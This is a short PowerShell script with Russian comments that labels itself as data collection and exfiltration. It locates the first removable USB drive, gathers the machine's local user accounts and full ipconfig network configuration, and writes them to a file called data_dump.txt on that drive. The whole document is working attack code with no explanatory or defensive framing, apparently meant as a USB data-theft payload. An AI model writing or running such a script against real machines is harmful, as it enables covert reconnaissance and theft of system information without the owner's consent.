$Flash = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1
$Dest = "$($Flash.DriveLetter)\data_dump.txt"

# 1. Сбор: Список пользователей и сетевая информация
$Users = Get-LocalUser | Format-List | Out-String
$Net = ipconfig /all | Out-String

# 2. Эксфильтрация: Сохранение данных на флешку
$Users | Out-File -FilePath $Dest -Append
$Net | Out-File -FilePath $Dest -Append
